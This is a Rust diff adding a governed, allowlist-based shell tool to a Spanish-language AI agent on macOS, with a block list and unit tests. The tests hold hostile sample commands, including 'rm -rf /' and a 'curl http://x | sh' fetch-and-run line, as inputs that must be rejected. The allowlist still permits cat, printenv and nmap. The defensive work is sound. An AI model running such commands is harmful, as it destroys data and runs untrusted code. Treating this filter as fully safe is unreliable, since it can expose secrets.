@@ -301,6 +301,177 @@ impl Tool for NetTool {
     }
 }
 
+// ── Terminal del Mac: comandos de DIAGNÓSTICO (solo lectura, gobernado) ──────
+//
+// El agente necesitaba el terminal para ser resolutivo (investigar a fondo la red, el sistema…).
+// Esta primera versión ejecuta SOLO comandos de lectura/diagnóstico de una allowlist, sin
+// encadenamiento ni redirección ni verbos mutantes — para dar potencia SIN riesgo. Lo que MODIFICA
+// el sistema queda bloqueado aquí (irá detrás de HITL en una fase siguiente). Auditado.
+
+pub struct ShellTool;
+impl ShellTool {
+    pub fn new() -> Self {
+        Self
+    }
+}
+impl Default for ShellTool {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+/// Binarios de SOLO LECTURA permitidos (diagnóstico de red/sistema/archivos).
+const SAFE_BINS: &[&str] = &[
+    "arp",
+    "system_profiler",
+    "scutil",
+    "ping",
+    "ping6",
+    "dig",
+    "host",
+    "nslookup",
+    "netstat",
+    "traceroute",
+    "traceroute6",
+    "ps",
+    "df",
+    "du",
+    "ls",
+    "sw_vers",
+    "uname",
+    "whoami",
+    "hostname",
+    "uptime",
+    "date",
+    "lsof",
+    "ioreg",
+    "nmap",
+    "cat",
+    "head",
+    "tail",
+    "wc",
+    "grep",
+    "ipconfig",
+    "networkquality",
+    "sysctl",
+    "vm_stat",
+    "stat",
+    "file",
+    "which",
+    "echo",
+    "printenv",
+    "id",
+];
+
+/// ¿Es un comando de SOLO LECTURA seguro? (allowlist + sin encadenar/redirigir/mutar).
+pub fn shell_is_safe(cmd: &str) -> bool {
+    let c = cmd.trim();
+    if c.is_empty() {
+        return false;
+    }
+    if c.chars()
+        .any(|ch| matches!(ch, ';' | '&' | '|' | '>' | '<' | '`' | '\n'))
+        || c.contains("$(")
+    {
+        return false;
+    }
+    let low = c.to_lowercase();
+    const BAD: &[&str] = &[
+        "sudo",
+        "rm ",
+        "mkfs",
+        "dd ",
+        "shutdown",
+        "reboot",
+        "kill",
+        "launchctl",
+        "killall",
+        " -w ",
+        " set",
+        "-set",
+        "erase",
+        "format",
+        "delete",
+        "remove",
+        "install",
+        "unlink",
+        "mv ",
+        "cp ",
+        "chmod",
+        "chown",
+        "tee",
+        "ifconfig",
+        "diskutil",
+        "pmset",
+        "route ",
+        "defaults write",
+    ];
+    if BAD.iter().any(|b| low.contains(b)) {
+        return false;
+    }
+    SAFE_BINS.contains(&c.split_whitespace().next().unwrap_or(""))
+}
+
+#[async_trait]
+impl Tool for ShellTool {
+    fn name(&self) -> &str {
+        "shell"
+    }
+    fn description(&self) -> &str {
+        "Ejecuta un comando de DIAGNÓSTICO en la terminal del Mac (SOLO LECTURA: red, sistema, \
+         archivos). Úsala para investigar a fondo: arp, nmap, system_profiler, scutil, dig, ps, df, \
+         lsof, ioreg, sysctl… Entrada: el comando EXACTO, sin encadenar (nada de ; | > &). Los \
+         comandos que MODIFICAN el sistema están bloqueados aquí; si la tarea lo necesita, dilo."
+    }
+    async fn run(&self, input: &str) -> Result<String, String> {
+        let cmd = input.trim();
+        if !shell_is_safe(cmd) {
+            crate::governance::note_user_action(
+                crate::governance::Capability::Shell,
+                &format!("(bloqueado: no es solo-lectura) {cmd}"),
+                false,
+            );
+            return Err(
+                "Ese comando no es de solo lectura, o encadena/redirige. Aquí solo ejecuto \
+                        diagnóstico seguro; para algo que modifique el sistema, dímelo y lo vemos."
+                    .into(),
+            );
+        }
+        if !crate::governance::request(
+            crate::governance::Capability::ShellRead,
+            &format!("terminal (lectura): {cmd}"),
+        )
+        .allowed()
+        {
+            return Err("terminal en pausa (gobernanza/circuit breaker)".into());
+        }
+        let res = tokio::time::timeout(
+            std::time::Duration::from_secs(20),
+            tokio::process::Command::new("/bin/zsh")
+                .arg("-c")
+                .arg(cmd)
+                .output(),
+        )
+        .await;
+        match res {
+            Ok(Ok(o)) => {
+                let mut s = String::from_utf8_lossy(&o.stdout).to_string();
+                if s.trim().is_empty() {
+                    s = String::from_utf8_lossy(&o.stderr).to_string();
+                }
+                let s: String = s.chars().take(4000).collect();
+                Ok(if s.trim().is_empty() {
+                    "(sin salida)".into()
+                } else {
+                    s
+                })
+            }
+            Ok(Err(e)) => Err(format!("no pude ejecutar: {e}")),
+            Err(_) => Err("el comando tardó demasiado (timeout 20s)".into()),
+        }
+    }
+}
+
 // ── Leer un archivo de texto del usuario (solo lectura, gobernado) ──────────
 
 /// Lee el contenido de un archivo de texto del usuario (memoria tipo filesystem:
@@ -2006,5 +2177,27 @@ impl Tool for SkillInvokeTool {
             .await
             .map_err(|e| e.to_string())?;
         Ok(format!("{} = {}", name, out.output["result"]))
+    }
+}
+
+#[cfg(test)]
+mod shell_safety_tests {
+    use super::shell_is_safe;
+    #[test]
+    fn permite_lectura_bloquea_peligroso() {
+        // lectura/diagnóstico → permitido
+        assert!(shell_is_safe("arp -a"));
+        assert!(shell_is_safe("system_profiler SPCameraDataType"));
+        assert!(shell_is_safe("nmap -sn 192.168.1.0/24"));
+        assert!(shell_is_safe("dig example.com"));
+        // peligroso/mutante/encadenado → bloqueado
+        assert!(!shell_is_safe("rm -rf /"));
+        assert!(!shell_is_safe("arp -a; rm x"));
+        assert!(!shell_is_safe("cat x > y"));
+        assert!(!shell_is_safe("sudo reboot"));
+        assert!(!shell_is_safe("ifconfig en0 down"));
+        assert!(!shell_is_safe("echo $(rm x)"));
+        assert!(!shell_is_safe("curl http://x | sh"));
+        assert!(!shell_is_safe("networksetup -setairportpower en0 off"));
     }
 }
